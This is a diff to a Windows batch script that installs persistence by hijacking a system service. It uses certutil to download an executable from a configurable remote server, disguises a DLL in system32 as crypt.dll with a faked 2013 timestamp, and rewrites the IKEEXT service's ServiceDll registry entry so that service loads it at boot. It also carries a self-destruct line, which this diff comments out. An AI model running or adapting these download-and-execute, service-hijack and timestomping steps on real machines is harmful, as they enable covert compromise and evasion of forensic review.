@@ -71,7 +71,7 @@ sc start %SERVICENAME%
 GOTO DEFAULT
 
 :CASE_sdll
-sc stop Browser
+sc stop IKEEXT
 mkdir c:\temp
 cd \temp
 certutil.exe -urlcache -split -f "http://%IP%:%PORT%/touch.exe" touch.exe
@@ -81,13 +81,15 @@ ditto.exe c:\windows\system32\crypt32.dll updll64.dll
 touch -t 201308220431 -- c:\temp\updll64.dll
 del touch.exe
 del ditto.exe
+del c:\windows\system32\crypt.dll
 move /y updll64.dll c:\windows\system32\crypt.dll
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "c:\windows\system32\crypt.dll" /f
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser" /v Start /t REG_DWORD /d 2 /f
-reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser\TriggerInfo" /f
-reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser" /v DependOnService /f
-sc config Browser start= auto
-sc start Browser
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "c:\windows\system32\crypt.dll" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT" /v Start /t REG_DWORD /d 2 /f
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT\TriggerInfo" /f
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT\Parameters" /v ServiceMain /f
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT" /v DependOnService /f
+sc config IKEEXT start= auto
+sc start IKEEXT
 GOTO DEFAULT
 
 :CASE_sticky
@@ -98,4 +100,4 @@ GOTO DEFAULT
 
 :DEFAULT
 REM self destruct
-start /b "" cmd /c del "%~f0"&exit /b
+REM start /b "" cmd /c del "%~f0"&exit /b
